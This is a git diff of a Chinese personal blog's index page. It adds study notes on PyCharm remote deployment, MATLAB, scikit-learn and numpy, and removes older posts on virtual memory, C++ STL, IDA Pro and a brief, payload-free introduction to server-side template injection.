@@ -64,6 +64,199 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-pycharm远程连接服务器" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/05/08/pycharm%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5%E6%9C%8D%E5%8A%A1%E5%99%A8/" class="article-date">
+  <time datetime="2021-05-08T07:51:29.000Z" itemprop="datePublished">2021-05-08</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/05/08/pycharm%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5%E6%9C%8D%E5%8A%A1%E5%99%A8/">pycharm远程连接服务器</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <ol>
+<li><p>Pycharm菜单栏，如下图所示，依次点击 Tools -&gt; Deployment -&gt; Configration </p>
+<p>​            1.1connection设置里，注意Root path直接用默认的就好，不要Autodetect</p>
+</li>
+</ol>
+<p><img src="C:%5CUsers%5Caaa%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210508161254735.png" alt="image-20210508161254735"></p>
+<p>1.2 Mappings设置中，Deployment path将会指定一个 用来放置等会上传本地代码的路径（注意这里的路径一定要有远程操纵权限，不然等等upload时会失败）（这个服务器明显是多人共用的，我们只能操纵/home/xuej这个属于我们的用户文件夹）</p>
+<img src="C:\Users\aaa\AppData\Roaming\Typora\typora-user-images\image-20210508155622693.png" alt="image-20210508155622693" style="zoom:80%;" />
+
+<p>1.3上传本地代码到服务器指定路径</p>
+<img src="C:\Users\aaa\AppData\Roaming\Typora\typora-user-images\image-20210508161018357.png" alt="image-20210508161018357" style="zoom:80%;" />
+
+
+
+<p>2.配置服务器远程python环境</p>
+<img src="C:\Users\aaa\AppData\Roaming\Typora\typora-user-images\image-20210508161336398.png" alt="image-20210508161336398" style="zoom:80%;" />
+
+<p>没有sudo权限就不要打勾。sync folders调整成之前设置的服务器上传路径</p>
+<p><img src="C:%5CUsers%5Caaa%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210508161944686.png" alt="image-20210508161944686"></p>
+<p>3.成功运行</p>
+<p><img src="C:%5CUsers%5Caaa%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210508162714277.png" alt="image-20210508162714277"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2021/05/08/pycharm%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5%E6%9C%8D%E5%8A%A1%E5%99%A8/" data-id="ckofhj9me00000cel15zd2gep" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-逆向工具" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/04/10/%E9%80%86%E5%90%91%E5%B7%A5%E5%85%B7/" class="article-date">
+  <time datetime="2021-04-10T03:48:50.000Z" itemprop="datePublished">2021-04-10</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/04/10/%E9%80%86%E5%90%91%E5%B7%A5%E5%85%B7/">逆向工具</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2021/04/10/%E9%80%86%E5%90%91%E5%B7%A5%E5%85%B7/" data-id="ckofhj9mn00010celhof795uk" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-matlab" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/04/06/matlab/" class="article-date">
+  <time datetime="2021-04-06T12:09:45.000Z" itemprop="datePublished">2021-04-06</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/04/06/matlab/">matlab</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>训练n组数据，每组有m个特征</p>
+<p>则一般的输入P，为m*n维。</p>
+<p> x = [1,3,5,7; 2,4,6, 8; 3,5,7,9]  可创建二维数组矩阵 3*4</p>
+<p> A(:,j)表示取A矩阵的第j列全部元素；A(i,:)表示A矩阵第i行的全部元素；A(i,j)表示取A矩阵第i行、第j列的元素 </p>
+<p>reshape(inputA,1,[]) 1-<em>n      reshape(inputA,[],1)  n</em> -1</p>
+<p> a(1:2,1:3)，进行提取a矩阵的第1,2行第1到3列 </p>
+<p>环境预设-&gt;常规-&gt;更新工具箱缓存</p>
+<p> zeros(1,n)格式就可以定义全零的一维数组 ， zeros(3,4)会生成一个3行4列的全零数组 </p>
+<p>元胞数组A,cell2mat(A)可把元胞数组转为普通数组。</p>
+<p>P=[A,B]</p>
+<p>A,B俩矩阵左右合并(A,B行数一致)</p>
+<p>P=[A;B]</p>
+<p>A,B俩矩阵上下合并（A,B列数一致）</p>
+<p>newff自带归一化。python sklearn的神经网络包不带。</p>
+<p>A=[]</p>
+<p>A=[A; b]</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2021/04/06/matlab/" data-id="ckofhj9n500040cel3ki49onl" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-sklearn" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/04/03/sklearn/" class="article-date">
+  <time datetime="2021-04-03T12:40:07.000Z" itemprop="datePublished">2021-04-03</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/04/03/sklearn/">sklearn</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="1-将一维列表转换为多维列表"><a href="#1-将一维列表转换为多维列表" class="headerlink" title="1.将一维列表转换为多维列表"></a>1.将一维列表转换为多维列表</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;[1,2,3,1,4,5,5846,464,64,456,456,4]</span><br><span class="line">print(a)</span><br><span class="line">b&#x3D;numpy.array(a).reshape(len(a),1)   # reshape(一列的长度（行数），一行的长度（列数）)</span><br><span class="line">print(b)  #转换为二维矩阵</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="2-数据标准化处理"><a href="#2-数据标准化处理" class="headerlink" title="2.数据标准化处理"></a>2.数据标准化处理</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># encoding: utf-8</span><br><span class="line">from sklearn.neural_network import MLPRegressor</span><br><span class="line">from sklearn.preprocessing import StandardScaler</span><br><span class="line">from sklearn import datasets</span><br><span class="line">from sklearn.model_selection import train_test_split</span><br><span class="line"> </span><br><span class="line">scaler &#x3D; StandardScaler()</span><br><span class="line">scaler.fit(X)#输入二维矩阵，行数是样本个数，列数是特征数</span><br><span class="line">X_train &#x3D; scaler.transform(X_train)#输入二维矩阵，行数是样本个数，列数是特征数。返回也是同样的形状</span><br><span class="line">X_test &#x3D; scaler.transform(X_test)</span><br><span class="line">print X_train[:2]</span><br><span class="line"></span><br><span class="line">MinMaxScaler方法默认是对每一列做这样的归一化操作</span><br></pre></td></tr></table></figure>
+
+<h1 id="3-数据分割"><a href="#3-数据分割" class="headerlink" title="3.数据分割"></a>3.数据分割</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">X_train, X_test, y_train, y_test &#x3D; train_test_split(X, y, test_size&#x3D;0.33,random_state&#x3D;42)</span><br><span class="line"></span><br><span class="line">输入的X，y有 相同的 length &#x2F; shape[0]</span><br></pre></td></tr></table></figure>
+
+<h1 id="4-zip"><a href="#4-zip" class="headerlink" title="4.zip()"></a>4.zip()</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">zip()将两个list转成二维</span><br><span class="line">x &#x3D; [1, 2, 3]</span><br><span class="line">y &#x3D; [4, 5, 6]</span><br><span class="line">zipped &#x3D; zip(x, y)</span><br><span class="line">#[(1, 4), (2, 5), (3, 6)]</span><br><span class="line"> x2, y2 &#x3D; zip(*zipped)#解压缩</span><br></pre></td></tr></table></figure>
+
+<h1 id="5-BP网络"><a href="#5-BP网络" class="headerlink" title="5.BP网络"></a>5.BP网络</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">import random</span><br><span class="line">from sklearn.neural_network import MLPClassifier, MLPRegressor</span><br><span class="line">import xlrd</span><br><span class="line">import cmath</span><br><span class="line">from sklearn.preprocessing import StandardScaler, MinMaxScaler</span><br><span class="line">import numpy</span><br><span class="line">data &#x3D; xlrd.open_workbook(&#39;fpga_bp数据.xlsx&#39;)</span><br><span class="line">table &#x3D; data.sheets()[0]</span><br><span class="line">real_Y&#x3D;table.col_values(0,2,102)#取第一列，3到103-1行</span><br><span class="line">input&#x3D;table.col_values(1,2,102)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">z &#x3D; list(zip(input,real_Y))</span><br><span class="line">#print(z)</span><br><span class="line">random.shuffle(z)</span><br><span class="line">#print(z)</span><br><span class="line"></span><br><span class="line">input,real_Y&#x3D;list(zip(*z))</span><br><span class="line">train_x&#x3D;input[0:74]</span><br><span class="line">train_y&#x3D;real_Y[0:74]</span><br><span class="line">val_x&#x3D;input[75:99]</span><br><span class="line">val_y&#x3D;real_Y[75:99]</span><br><span class="line"></span><br><span class="line">scaler &#x3D;  MinMaxScaler()</span><br><span class="line">scaler.fit(numpy.array(list(input)).reshape(len(list(input)),1))</span><br><span class="line">train_x&#x3D;scaler.transform(numpy.array(list(train_x)).reshape(len(list(train_x)),1))</span><br><span class="line">val_x&#x3D;scaler.transform(numpy.array(list(val_x)).reshape(len(list(val_x)),1))</span><br><span class="line"></span><br><span class="line">print(train_x)</span><br><span class="line">print(train_y)</span><br><span class="line">#print(numpy.array(list(train_x)).reshape(len(list(train_x)),1))</span><br><span class="line">bp &#x3D; MLPRegressor(hidden_layer_sizes&#x3D;(6),activation&#x3D;&#39;relu&#39;,solver&#x3D;&#39;lbfgs&#39;, max_iter&#x3D;10000,tol&#x3D;0.00000001,epsilon&#x3D;50000)</span><br><span class="line">bp.fit(numpy.array(list(train_x)).reshape(len(list(train_x)),1),list(train_y))</span><br><span class="line">print(bp.predict([[58.9158774088125],[104.656714049333]]))</span><br><span class="line">print(bp.score(numpy.array(list(val_x)).reshape(len(list(val_x)),1),list(val_y)))</span><br><span class="line">error&#x3D;val_y-bp.predict(numpy.array(list(val_x)).reshape(len(list(val_x)),1))</span><br><span class="line">sum_square_error&#x3D;0</span><br><span class="line">for i in  error:</span><br><span class="line">    sum_square_error+&#x3D;i**2</span><br><span class="line">rmse&#x3D;cmath.sqrt(sum_square_error&#x2F;len(error))</span><br><span class="line">print(&#39;rmse&#39;,rmse)</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2021/04/03/sklearn/" data-id="ckofhj9n200020cel68robjrr" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-Hill" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2021/03/17/Hill/" class="article-date">
@@ -102,9 +295,9 @@
 
 
   
-    <article id="post-matrix" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-py matrix" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2021/03/16/matrix/" class="article-date">
+    <a href="/2021/03/16/py%20matrix/" class="article-date">
   <time datetime="2021-03-16T06:18:37.000Z" itemprop="datePublished">2021-03-16</time>
 </a>
     
@@ -116,7 +309,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2021/03/16/matrix/">matrix</a>
+      <a class="article-title" href="/2021/03/16/py%20matrix/">matrix</a>
     </h1>
   
 
@@ -179,11 +372,20 @@
 <h3 id="五-numpy-ravel-a-order-’C’"><a href="#五-numpy-ravel-a-order-’C’" class="headerlink" title="五. numpy.ravel(a, order=’C’**)**"></a>五. <code>numpy.ravel</code><strong>(</strong>a<strong>,</strong> <em>order=’C’**</em>)**</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x &#x3D; np.array([[1, 2, 3], [4, 5, 6]])</span><br><span class="line">np.ravel(x)</span><br><span class="line">-&gt;array([1, 2, 3, 4, 5, 6])</span><br></pre></td></tr></table></figure>
 
 <h3 id="六-np-transpose-x"><a href="#六-np-transpose-x" class="headerlink" title="六.np.transpose(x)"></a>六.np.transpose(x)</h3><p>矩阵转置</p>
+<h2 id="七-二维转一维"><a href="#七-二维转一维" class="headerlink" title="七.二维转一维"></a>七.二维转一维</h2><p>—–   X: [[ 0  1  2] [ 3  4  5] [ 6  7  8] [ 9 10 11]] </p>
+<p> X1= X.reshape(-1,) </p>
+<p>—— X1: [ 0  1  2  3  4  5  6  7  8  9 10 11] </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">reduce(function, iterable)</span><br><span class="line">将一个数据集合中的所有数据进行下列操作：用传给 reduce 中的函数 function（有两个参数）先对集合中的第 1、2 个元素进行操作，得到的结果再与第三个数据用 function 函数运算，最后得到一个结果。</span><br><span class="line">import operator</span><br><span class="line">from functools import reduce</span><br><span class="line">A&#x3D;reduce(operator.add, A)#将二维A转一维</span><br></pre></td></tr></table></figure>
+
+
+
+<p>八.用pycharm时，想要进入对应的函数内部按住Ctrl，然后鼠标点击对应的方法，即可查看当前方法调用的函数。</p>
+<p>要想返回到调用原始函数处，按时alt+←</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/03/16/matrix/" data-id="ckmdlisy50001lselh9hu1dtu" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/03/16/py%20matrix/" data-id="ckofhj9n400030celhe3b7uos" class="article-share-link">Share</a>
       
       
     </footer>
@@ -415,433 +617,11 @@
 
 
   
-    <article id="post-虚拟地址" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/10/08/%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80/" class="article-date">
-  <time datetime="2020-10-08T11:59:26.000Z" itemprop="datePublished">2020-10-08</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/10/08/%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80/">虚拟地址</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p> 实模式下的寻址方式“段基址+段偏移”的形式 </p>
-<p> 虚拟地址是Windows程序时运行在386保护模式下，这样程序访问<a href="https://baike.baidu.com/item/存储器/1583185" target="_blank" rel="noopener">存储器</a>所使用的<a href="https://baike.baidu.com/item/逻辑地址/3283849" target="_blank" rel="noopener">逻辑地址</a>称为虚拟地址 </p>
-<p> Windows 2000 使用基于<a href="https://baike.baidu.com/item/分页" target="_blank" rel="noopener">分页</a>机制的<a href="https://baike.baidu.com/item/虚拟内存" target="_blank" rel="noopener">虚拟内存</a>。每个进程有4GB的虚拟<a href="https://baike.baidu.com/item/地址空间" target="_blank" rel="noopener">地址空间</a>。基于分页机制，这4GB地址空间的一些部分被映射了<a href="https://baike.baidu.com/item/物理内存" target="_blank" rel="noopener">物理内存</a>，一些部分映射硬盘上的交换文件，一些部分什么也没有映射。程序中使用的都是4GB地址空间中的虚拟地址。而访问物理内存，需要使用<a href="https://baike.baidu.com/item/物理地址" target="_blank" rel="noopener">物理地址</a>。 </p>
-<p><a href="https://baike.baidu.com/item/物理地址" target="_blank" rel="noopener"><strong>物理地址</strong></a> (physical address): 放在寻址总线上的地址。放在寻址总线上，如果是读，电路根据这个地址每位的值就将相应地址的<a href="https://baike.baidu.com/item/物理内存" target="_blank" rel="noopener">物理内存</a>中的数据放到<a href="https://baike.baidu.com/item/数据总线" target="_blank" rel="noopener">数据总线</a>中传输。如果是写，电路根据这个地址每位的值就在相应地址的物理内存中放入数据总线上的内容。物理内存是以<a href="https://baike.baidu.com/item/字节" target="_blank" rel="noopener">字节</a>(8位)为单位<a href="https://baike.baidu.com/item/编址" target="_blank" rel="noopener">编址</a>的。</p>
-<p><strong>虚拟地址</strong> (virtual address): CPU启动保护模式后，程序运行在虚拟<a href="https://baike.baidu.com/item/地址空间" target="_blank" rel="noopener">地址空间</a>中。注意，并不是所有的“程序”都是运行在虚拟地址中。CPU在启动的时候是运行在实模式的，Bootloader以及内核在初始化页表之前并不使用虚拟地址，而是直接使用物理地址的。</p>
-<p>如果CPU寄存器中的分页标志位被设置，那么执行内存操作的<a href="https://baike.baidu.com/item/机器指令" target="_blank" rel="noopener">机器指令</a>时，CPU（准确来说，是<a href="https://baike.baidu.com/item/MMU" target="_blank" rel="noopener">MMU</a>，即Memory Management Unit，内存管理单元）会自动根据页目录和<a href="https://baike.baidu.com/item/页表" target="_blank" rel="noopener">页表</a>中的信息，把虚拟地址转换成物理地址，完成该指令。</p>
-<p> 如果是32位处理器，则内地址总线是32位的，与CPU执行单元相连（图中只是示意性地画了4条地址线），而经过MMU转换之后的外地址总线则不一定是32位的。也就是说，虚拟地址空间和物理地址空间是独立的，32位处理器的虚拟地址空间是4GB，而物理地址空间既可以大于也可以小于4GB。 </p>
-<p>CPU通过地址来访问内存中的单元，地址有虚拟地址和物理地址之分，如果CPU没有MMU（Memory Management Unit，内存管理单元），或者有MMU但没有启用，CPU核在取指令或访问内存时发出的地址将直接传到CPU芯片的外部地址引脚上，直接被内存芯片（以下称为物理内存，以便与虚拟内存区分）接收，这称为物理地址（Physical Address，以下简称PA）</p>
-<p>​                          </p>
-<p>如果CPU启用了MMU，CPU核发出的地址将被MMU截获，从CPU到MMU的地址称为虚拟地址（Virtual Address，以下简称VA），而MMU将这个地址翻译成另一个地址发到CPU芯片的外部地址引脚上，也就是将虚拟地址映射成物理地址</p>
-<p>​        虚拟内存：虚拟内存是一种逻辑上扩充物理内存的技术。基本思想是用软、硬件技术把内存与外存这两级存储器当做一级存储器来用。虚拟内存技术的实现利用了自动覆盖和交换技术。简单的说就是将硬盘的一部分作为内存来使用。</p>
-<p>  虚拟地址空间：在32位的i386 CPU的地址总线的是32位的，也就是说可以寻找到4G的地址空间。我们的程序被CPU执行，就是在0x00000000到0xFFFFFFFF这一段地址中。高2G的空间为内核空间，由操作系统调用，低2G的空间为用户空间，由用户使用。</p>
-<p>  CPU在寻址的时候，是按照虚拟地址来寻址，然后通过MMU(内存管理单元)将虚拟地址转换为物理地址。因为只有程序的一部分加入到内存中，所以会出现所寻找的地址不在内存中的情况（CPU产生缺页异常），如果在内存不足的情况下，就会通过页面调度算法来将内存中的页面置换出来，然后将在外存中的页面加入到内存中，使程序继续正常运行。</p>
-<p> 可以看出，虚拟地址空间和虚拟内存的一个关键的因素是MMU（内存管理单元）。</p>
-<p>  现在一个程序的执行现在可以分为3部分：</p>
-<p>  1：CPU需要执行的语句的虚拟地址。</p>
-<p>  2：程序装入内存的部分</p>
-<p>  3：程序再外存中的部分</p>
-<p>  因为CPU是通过时间片轮转的方法使不同的程序并发执行的。所以在某一时刻只有一个程序占据CPU资源，CPU的最大的寻址空间为4G，所以说可以将每个程序可以看做独立占据4G的内存（只是可以看成，但是它并没有占据实际的4G内存）。而CPU是将虚拟地址空间里面的代码执行，如果在内存中寻找不到所需要的页面，就需要到外存中寻找，外存的这一部分，我们可以当成内存来使用，这也就是虚拟内存。虚拟地址空间不等于虚拟内存。虚拟地址空间是一个空间，不是真正存在的，只是通过CPU的寻址虚拟出来的一个范围。而虚拟内存是实实在在的硬盘的空间。               </p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/10/08/%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80/" data-id="ckmdlisyq0006lsel58u6bkj3" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-C-std" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/09/26/C-std/" class="article-date">
-  <time datetime="2020-09-26T12:41:12.000Z" itemprop="datePublished">2020-09-26</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/09/26/C-std/">C++ std</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>map</p>
-<p>//遍历</p>
-<p>#include <iostream><br>#include <map><br>using namespace std;<br>int main() {<br>    map&lt;int,int&gt; p;<br>    p[0] = 1;<br>    p[1] = 2;<br>    p[3] = 4;<br>    map&lt;int,int&gt;::iterator it;<br>    for(it = p.begin(); it != p.end(); it++) {<br>        cout&lt;<it->first&lt;&lt;” “&lt;<it->second&lt;&lt;endl;<br>    }<br>    return 0;<br>}</p>
-<p>//插入元素3种方法<br> 第一种：用insert函数插入pair数据 </p>
-<p>map&lt;int, string&gt; mapStudent;</p>
-<p>mapStudent.insert(pair&lt;int, string&gt;(1, “student_one”));</p>
-<p> 第二种：用insert函数插入value_type数据 </p>
-<p>map&lt;int, string&gt; mapStudent;</p>
-<p>mapStudent.insert(map&lt;int, string&gt;::value_type (1, “student_one”));</p>
-<p>第三种：用数组方式插入数据 </p>
-<p>map&lt;int, string&gt; mapStudent;</p>
-<p>mapStudent[1] = “student_one”;</p>
-<p>mapStudent[2] = “student_two”; </p>
-<p>mapStudent[3] = “student_three”;</p>
-<h1 id="C风格字符串和C-风格字符串转换"><a href="#C风格字符串和C-风格字符串转换" class="headerlink" title="C风格字符串和C++风格字符串转换"></a>C风格字符串和C++风格字符串转换</h1><h4 id="一、C风格—-gt-C-风格"><a href="#一、C风格—-gt-C-风格" class="headerlink" title="一、C风格—&gt;C++风格"></a>一、C风格—&gt;C++风格</h4><pre><code>char c[] = &quot;hello world&quot;;
-string s(c);
-
-cout &lt;&lt; s &lt;&lt; endl;  //hello world</code></pre><h4 id="二、C-风格—-gt-C风格"><a href="#二、C-风格—-gt-C风格" class="headerlink" title="二、C++风格—&gt;C风格"></a>二、C++风格—&gt;C风格</h4><pre><code>int i;
-string s = &quot;hello world&quot;;
-const char *p = s.c_str();  //const不能省去！
-
-for (i = 0; i &lt; s.length(); i++) {
-    cout &lt;&lt; p[i];  //hello world
-}</code></pre><h4 id="三、C和C-在终端获取一整行字符串"><a href="#三、C和C-在终端获取一整行字符串" class="headerlink" title="三、C和C++在终端获取一整行字符串"></a>三、C和C++在终端获取<code>一整行</code>字符串</h4><p><strong>C++中：</strong></p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">string</span> s;</span><br><span class="line">getline(<span class="built_in">cin</span>, s);<span class="number">12</span></span><br></pre></td></tr></table></figure>
-
-<p>getline会读取一整行字符串（包括空格），而如果使用: cin &gt;&gt; s; 那么遇到空格将停止读取。</p>
-<p><strong>C中：</strong></p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> c[<span class="number">100</span>];</span><br><span class="line">gets(c);<span class="number">12</span></span><br></pre></td></tr></table></figure>
-
-<p>gets也会读取空格。利用puts输出即可。而如果使用: scanf(“%s”, c); 也是遇到空格停止读取。</p>
-<h1 id="【C-】STL之队列queue"><a href="#【C-】STL之队列queue" class="headerlink" title="【C++】STL之队列queue"></a><a href="https://www.cnblogs.com/wanglei5205/p/8630897.html" target="_blank" rel="noopener">【C++】STL之队列queue</a></h1><h1 id="include"><a href="#include" class="headerlink" title="# include"></a># include<queue></h1><ul>
-<li><p><strong>empty()</strong></p>
-</li>
-<li><ul>
-<li>当队列为空时，返回true</li>
-</ul>
-</li>
-<li><p><strong>size()</strong></p>
-</li>
-<li><ul>
-<li>返回队列内元素个数</li>
-</ul>
-</li>
-<li><p><strong>front()</strong></p>
-</li>
-<li><ul>
-<li>返回队首元素</li>
-</ul>
-</li>
-<li><p><strong>back()</strong></p>
-</li>
-<li><ul>
-<li>返回队尾元素</li>
-</ul>
-</li>
-<li><p><strong>push(x)</strong></p>
-</li>
-<li><ul>
-<li>将x压入队尾</li>
-</ul>
-</li>
-<li><p><strong>pop()</strong></p>
-</li>
-<li><ul>
-<li>弹出队首元素</li>
-</ul>
-</li>
-</ul>
-<p> <img src="http://images.cnitblog.com/i/617081/201405/092204364017544.jpg" alt="img"> </p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/09/26/C-std/" data-id="ckfjo92460000ywelffnec92q" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-ida-pro" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/08/19/ida-pro/" class="article-date">
-  <time datetime="2020-08-19T02:24:28.000Z" itemprop="datePublished">2020-08-19</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/08/19/ida-pro/">ida pro</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>32 位文件要用32位 ida打开</p>
-<p>64 位文件要用64位 ida打开</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/08/19/ida-pro/" data-id="ckfjo92570002ywelezmy4sgd" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-ssti" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/08/07/ssti/" class="article-date">
-  <time datetime="2020-08-07T08:14:59.000Z" itemprop="datePublished">2020-08-07</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/08/07/ssti/">ssti</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p><del>顾名思义，服务端模板注入，就是通过在<strong>服务端</strong>的<strong>模板文件</strong>或<strong>模板字符串</strong>中注入特定的恶意代码导致产生代码执行的一种漏洞攻击方式。</del></p>
-<p>不同的模板引擎，根据不同的解析方式相应的也是存在不同的利用方法。</p>
-<p>正常而言，出于安全考虑，模板引擎基本上都是拥有沙盒、命名空间的，代码的解析执行都是发生在有限的沙盒里面，因此，沙盒逃逸也成为 SSTI 不可或缺的存在。</p>
-<h2 id="Python-Web-模板引擎"><a href="#Python-Web-模板引擎" class="headerlink" title="Python Web 模板引擎"></a>Python Web 模板引擎</h2><ul>
-<li><input checked="" disabled="" type="checkbox"> Jinja2</li>
-<li><input checked="" disabled="" type="checkbox"> Tornado.template</li>
-<li><input disabled="" type="checkbox"> Django.template</li>
-</ul>
-<p> <img src="https://img2018.cnblogs.com/i-beta/1828215/202002/1828215-20200216115106949-1035150176.png" alt="img"> </p>
-<p><strong>让用户提交 Python 代码并在服务器上执行，是一些 OJ、量化网站重要的服务，很多 CTF 也有类似的题。为了不让恶意用户执行任意的 Python 代码，就需要确保 Python 运行在沙箱中。沙箱经常会禁用一些敏感的函数，例如 os，研究怎么逃逸、防护这类沙箱还是蛮有意思的。</strong></p>
